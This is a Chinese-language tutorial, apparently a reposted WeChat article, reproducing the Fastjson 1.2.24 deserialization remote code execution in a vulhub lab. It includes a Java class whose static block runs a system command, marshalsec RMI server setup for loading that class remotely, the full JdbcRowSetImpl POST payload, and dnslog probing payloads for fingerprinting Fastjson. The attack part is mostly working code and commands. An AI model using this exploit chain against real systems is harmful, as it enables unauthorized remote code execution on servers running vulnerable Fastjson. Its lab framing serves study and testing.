> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRjs5WHrlZ2snZSdao2k6fSAiaJY6Mbp7PLnAbmkJ9qkicmwUqOawibhSKg/640?wx_fmt=png)

**0x01 前言**

**Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。**

**Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。**

**Fastjson 特性：**
----------------

```
    提供服务器端、安卓客户端两种解析工具，性能表现较好。
    提供了 toJSONString() 和 parseObject() 方法来将 Java 对象与 JSON 相互转换。调用toJSONString方 法即可将对象转换成 JSON 字符串，parseObject 方法则反过来将 JSON 字符串转换成对象。
    允许转换预先存在的无法修改的对象（只有class、无源代码）。
    Java泛型的广泛支持。
    允许对象的自定义表示、允许自定义序列化类。
    支持任意复杂对象（具有深厚的继承层次和广泛使用的泛型类型）。
```

**本次实验需要用到的环境：**

```
JDK环境
Maven环境
```

```
简单拓扑：
攻击机：192.168.142.129（kali19.2）
靶机：192.168.142.128(kali19.4)
RMI服务：192.168.142.129
```

**0x02 启动靶场**

这里直接利用现成的靶场环境 vulhub，详细安装过程可以参考小编的 CSDN 博客，在这不再赘述

```
https://blog.csdn.net/SuPejkj/article/details/103707207
```

```
cd /vulhub/fastjson/1.2.24-rce
docker-compose up -d
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRXMmDpwODiaGtcRvZWKzBhB80x7q64okPNaps8t44JOgeiasYkNV68ic9g/640?wx_fmt=png)  

靶场环境搭起来之后访问本机 IP 地址，默认 8090 端口

```
http://ip:8090
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRYAYX2K6rcZUKIiaf83vLfqUEOy2pxtfQo9bUwiaUmzCkIEZPBLJxGBgw/640?wx_fmt=png)

0x03 环境搭建

**① 安装 jdk 以及 maven 环境**（_**这里为了方便像我一样萌新的小白，会啰嗦一些。有环境的可以直接略过**_）  

1、下载 jdk 安装包

点击下面的链接选择合适的 JDK 版本下载：

```
http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html
```

2、建立目录，将下载的 jdk 复制过去并解压

```
sudo mkdir-p /usr/local/java
sudo cp jdk-8u161-linux-x64.tar.gz /usr/local/java
cd /usr/local/java
sudo tar xzvf jdk-8u91-linux-x64.tar.gz
```

3、配置环境变量

```
vim/etc/profile
###复制以下代码到文件结尾
JAVA_HOME=/usr/local/java/jdk1.8.0_211
PATH=$PATH:$HOME/bin:$JAVA_HOME/bin
export JAVA_HOME
export PATH
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRNEvKgPTWncTO7xviaXQOVvnQbtrtCmq0yMsiaqUlYutpcOicYQ34rzp4A/640?wx_fmt=png)  

4、通知系统 java 的位置

```
sudo update-alternatives --install "/usr/bin/java""java" "/usr/local/java/jdk1.8.0_211/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac""/usr/local/java/jdk1.8.0_211/bin/javac"1
sudo update-alternatives --install "/usr/bin/javaws""javaws" "/usr/local/java/jdk1.8.0_211/bin/javaws" 1
sudo update-alternatives --install "/usr/bin/javaws""javaws" "/usr/local/java/jdk1.8.0_211/bin/javaws" 1
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRLPM9MJ985YviaLpsWoeJHpEln3yicQowsJo6mdkRhCX5HBs06xd9FzdA/640?wx_fmt=png)

5、设置默认 JDK

```
sudoupdate-alternatives --set java /usr/local/java/jdk1.8.0_211/bin/java
sudoupdate-alternatives --set javac /usr/local/java/jdk1.8.0_211/bin/javac
sudoupdate-alternatives --set javaws /usr/local/java/jdk1.8.0_211/bin/javaws
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRLibASk3hAuibQFcgfwf5fCWXEftqgv1qh2dEFicoWWQNwxceeiaZ48dUhA/640?wx_fmt=png)

6、重新载入 profile

 从新载入之后执行如下命令，看到 java 的 version 之后证明 jdk 安装成功

```
source/etc/profile
java -version
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRUGOI2yygUicicVy7yYZpkj4DcyO26MP7erN0iape0Qr7vlozh8mLCxiaVw/640?wx_fmt=png)

② 安装 maven（linux 为例）

```
wget https://mirrors.bfsu.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz
```

下载成功之后先创建个 mvn 的文件夹，然后执行以下命令：

```
# mkdir /usr/local/apache-maven
# sudo mv apache-maven-3.6.3-bin.tar.gz /usr/local/apache-maven
# sudo tar -xzvf /usr/local/apache-maven/apache-maven-3.6.3-bin.tar.gz -C /usr/local/apache-maven/
# sudo update-alternatives --install /usr/bin/mvn mvn /usr/local/apache-maven/apache-maven-3.6.3/bin/mvn 1
# sudo update-alternatives --config mvn
# sudo apt-get install vim
# vim ~/.bashrc
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRVtAmGXnMNOIER8J0Qp747EQHBUh8RGtXVOTpodExDAQUdiaf5niaN1iag/640?wx_fmt=png)

将以下内容放到 bashrc 文件末尾处

```
export M2_HOME=/usr/local/apache-maven/apache-maven-3.6.3
export MAVEN_OPTS="-Xms256m -Xmx512m" 
export JAVA_HOME=/usr/local/java/jdk1.8.0_211
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRNpXXMicMwfZaHcxz2VH9ia1ALhCupm7TvY28UGjibh9AE6fgnf82vb44g/640?wx_fmt=png)  

保存后执行以下命令测试 mvn 环境是否安装成功

```
mvn -version
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRCYWSAVDjBXXjtAZreZeibq3iaX51ib5XeK3aibTc6zlsQ2JibC8Ql55SINg/640?wx_fmt=png)

可以看到 mvn 环境已经安装成功。

**0x04 漏洞复现**

环境安装好后就开始复现漏洞。先保存以下代码为 TouchFile.java 文件。（文件名可随便起）

```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"ping", "xxx.dnslog.cn"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

执行以下代码会生成一个 TouchFile.class 文件

```
javac TouchFile.java
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRdGJZjiacD9YbibwgRpodawHIyojpHHJibKCRibLIUNOjNYqYFS7wrSwVAg/640?wx_fmt=png)

把编译好的 class 文件传到外网系统中（这里我传到 kali19.2 服务器中）。并在 class 文件所在的目录，Python 起一个 http 服务。

```
python -m SimpleHTTPServer 4444  # 4444是端口，随便设置只要不冲突就可以
```

使用 marshalsec 项目，启动 RMI 服务，监听 9999 端口并加载远程类 TouchFile.class

github 项目地址：  

```
git clone https://github.com/mbechler/marshalsec.git
```

下载完成后 cd 进入到 marshalsec 项目文件里，用刚刚安装好的 maven 环境执行如下命令进行编译, 编译成功会生成一个 target 目录，出现如下编译成功。  

```
mvn clean package -DskipTests
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRqaemURHict4vpkASYk37GAuaqyNyfW2qJ4aM0wIlrOymWh4icXXsnwGA/640?wx_fmt=png)

_**成功是这样的，target 目录下会生成 marshalsec-0.0.3-SNAPSHOT-all.jar 文件。**_  

贴心的小编为懒得动手的小伙伴提供了直通车  

↓请继续往下看↓  

（建议还是自己动手操作一遍，记忆深刻）  

接下来开启 RMI 服务：

进入到编译好的文件中，执行如下命令：

```
cd target/
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://刚刚上传class文件的外网ip或域名/#TouchFile" 9999
```

这个时候攻击环境已经准备就绪了 ，祭出我们的神器 burp，然后直接执行 payload 就可以了![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVR95KKFyyx7aW2ic09Gze0Nuhzfm0l1w7via84MFG2wvKQycyhUJ0mWricw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRM1EK6rYjSx0cO7jybsktmzmBxre54QcDSO5Xj4lTzU53pIBvllDGOA/640?wx_fmt=png)

**附上 PAYLOAD：**  

```
POST / HTTP/1.1
Host: 192.168.142.128:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 167

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.142.129:9999/TouchFile",
        "autoCommit":true
    }

}
```

**这个酱紫就是成功的结果。**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRGygfZ3NGIVa3NoYmZbdI3A5QTyR0lB8dPLJicfZu50jnfXxVnZEx1sg/640?wx_fmt=png)

**这个酱紫是失败的**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVR0T5B6Obia8O3vf7gibv6KodcgkcjZibcnFhXY1q9ibuZSmpsc4GPYjCGicA/640?wx_fmt=png)

**dnslog 平台接收到执行命令的结果**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRr6Yahu6TH1bGHIlFT51RgKEkrvBFdLnfonO1kUR7SkopPRI7hxAYKA/640?wx_fmt=png)

**0x05 fastjson 指纹特征（****以下摘自 FREEBUF 一灯老和尚大佬的文章****）**
-------------------------------------------------------

### 1 根据返回包判断

任意抓个包，提交方式改为 POST，花括号不闭合。返回包在就会出现 fastjson 字样。当然这个可以屏蔽，如果屏蔽使用其它办法，往后翻。

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRh8V11a65Ho5ricRAqBs0cTDAYvwAkib3xBFJ9AJ3Dab3WBVBiaLg9WGiag/640?wx_fmt=png)

### 2 利用 dnslog 盲打  

构造以下 payload，利用 dnslog 平台接收。

> {"zeo":{"@type":"java.net.Inet4Address","val":"dnslog"}}

1.2.67 版本后 payload

> {"@type":"java.net.Inet4Address","val":"dnslog"}  
> {"@type":"java.net.Inet6Address","val":"dnslog"}  
> 畸形：  
> {"@type":"java.net.InetSocketAddress"{"address":,"val":"这里是 dnslog"}}

![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRiaO3M0K1kZJXZU7naZMiaFt2kzxOia71cmU6PGNe3xR0e6icoyiaUwicZeUw/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRuklUAacaJrchSDvhpiacecz3aA8f8A5XLUsK8RLatEDoQZIDM21tJDA/640?wx_fmt=jpeg)

> "@type":"java.net.InetSocketAddress"{"address":,"val":"这里是 dnslog"}}
> 
> ["@Type":"Java.Net.InetSocketAddress"{"address":,"Val":"Zhèlǐ shì dnslog"}}]"@Type":
> 
> "java.net.InetSocketAddress" {"address":, "val": "This is dnslog"}}

**萌新一个，写的不好，如有问题还请大佬们指教![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEJoHQdjBYUp5E4lVR7eicVRdH1d9iarcCxjvOXwu70U3vNEnMpIteagIcaV21VJNp0yqEIiaKhcPiaIA/640?wx_fmt=png)**

**0x06 参考链接**

```
https://www.freebuf.com/articles/web/242712.html
https://www.cnblogs.com/ssan/p/12844868.html
```

**【推荐书籍】**

  

文章总结

  

  

  

希望对大家有所帮助![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTFBCbwb6aZ1lmgLIOCfeTqibj53xIewIziarLwz6ERplWgBDMjWkfXIWGtSR9CpgRNtPtv86nHpAqjA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTFBCbwb6aZ1lmgLIOCfeTqibj53xIewIziarLwz6ERplWgBDMjWkfXIWGtSR9CpgRNtPtv86nHpAqjA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_gif/7D2JPvxqDTHK1Jibd4DcSy9t0aNQ4CNYHRHZjzPdb8bamhf1QnU8c7ZbII854PGDWmvpsrC25jAQxVBZibsia2SXA/640?wx_fmt=gif)

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**贴心的小编将编译好的工具已打包，关注回复** **fastjson** **获取**

![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTElwWr6JcnwvvZa5qWf8vgUAtCUGibactxcRZiaDE9k7RZbVibuZ7N2yxiahmzr2GCYPuRZdTJWibu4jAQ/640?wx_fmt=jpeg)

渗透 Xiao 白帽 发起了一个读者讨论 一起来划水，萌新写的不好，轻喷，有问题欢迎大佬们指教